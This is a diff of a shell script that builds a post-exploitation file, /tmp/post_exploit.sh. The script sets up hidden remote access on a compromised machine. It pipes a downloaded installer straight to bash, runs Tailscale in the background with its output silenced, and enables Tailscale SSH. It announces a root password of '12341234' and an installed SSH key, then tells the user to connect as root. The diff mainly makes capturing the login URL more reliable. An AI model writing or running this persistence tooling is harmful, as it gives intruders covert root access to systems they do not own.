@@ -54,11 +54,23 @@ curl -fsSL https://tailscale.com/install.sh | bash 2>/dev/null
 
 echo '[*] Step 5: Start Tailscale (userspace mode)'
 pkill tailscaled 2>/dev/null
-tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &
+tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &>/dev/null &
 sleep 3
 
-echo '[*] Step 6: Get Tailscale login URL'
-LOGIN_URL=$(tailscale up --ssh 2>&1 | grep -o 'https://login.tailscale.com/[^ ]*' | head -1)
+echo '[*] Step 6: Get Tailscale login URL (please wait)...'
+tailscale up --ssh &>/tmp/ts_output.log &
+TS_PID=$!
+
+# Wait for login URL to appear in logs
+LOGIN_URL=""
+for i in {1..30}; do
+    LOGIN_URL=$(grep -o 'https://login.tailscale.com/[^ ]*' /tmp/ts_output.log 2>/dev/null | head -1)
+    if [ -n "$LOGIN_URL" ]; then
+        break
+    fi
+    sleep 1
+done
+wait $TS_PID 2>/dev/null
 
 echo ''
 echo '========================================'
@@ -66,9 +78,15 @@ echo '[+] DONE!'
 echo '[+] Root password: 12341234'
 echo '[+] SSH key installed'
 echo ''
-echo '[*] Connect via Tailscale:'
-echo "    URL: $LOGIN_URL"
-echo '    After auth: ssh root@<tailscale-ip>'
+if [ -n "$LOGIN_URL" ]; then
+    echo "[*] Tailscale login URL:"
+    echo "    $LOGIN_URL"
+else
+    echo '[!] Could not get Tailscale URL. Run manually:'
+    echo '    tailscale up --ssh'
+fi
+echo ''
+echo '[*] After auth: ssh root@<tailscale-ip>'
 echo '========================================'
 POSTSCRIPT
 chmod +x /tmp/post_exploit.sh
